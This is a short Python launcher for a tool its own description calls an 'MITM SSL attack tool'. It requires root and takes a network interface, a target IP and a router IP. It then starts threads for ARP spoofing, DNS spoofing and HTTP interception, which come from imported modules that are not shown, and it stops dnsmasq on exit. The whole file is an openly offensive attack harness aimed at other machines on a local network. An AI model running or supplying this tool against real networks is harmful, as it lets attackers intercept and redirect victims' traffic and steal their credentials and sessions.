#!/usr/bin/env python3

import argparse
import os
import sys
import threading
import signal
from stage import mitm, router, dns, http  # Keep dns.py in stage/

parser = argparse.ArgumentParser(description='MITM SSL attack tool')
parser.add_argument('--iface', help='Interface to use', required=True)
parser.add_argument('--target', help='Target IP to attack', required=True)
parser.add_argument('--router', help='Router IP (used for MITM ARP spoofing)', required=True)
opts = parser.parse_args()

if os.getuid() != 0:
    print('[-] Must be run as root')
    sys.exit(1)

def stop_dnsmasq():
    """Stops the dnsmasq service"""
    print("\n[+] Stopping dnsmasq service...")
    os.system("systemctl stop dnsmasq")
    print("[+] dnsmasq service stopped.")

def signal_handler(sig, frame):
    """Handles termination signals to stop dnsmasq"""
    print("\n[!] Terminating attack...")
    stop_dnsmasq()
    sys.exit(0)

# Register the signal handler for Ctrl+C and termination signals
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def main():
    router.run()

    t_http = threading.Thread(target=http.run, args=(opts.iface,))
    t_mitm = threading.Thread(target=mitm.run, args=(opts.router, opts.target, opts.iface,))
    t_dns = threading.Thread(target=dns.run, args=(opts.router, opts.target, opts.iface,))

    
    t_mitm.start()
    t_dns.start()
    t_http.start()

    # Keep the main thread running to detect termination signals
    t_mitm.join()
    t_dns.join()

    

if __name__ == '__main__':
    main()
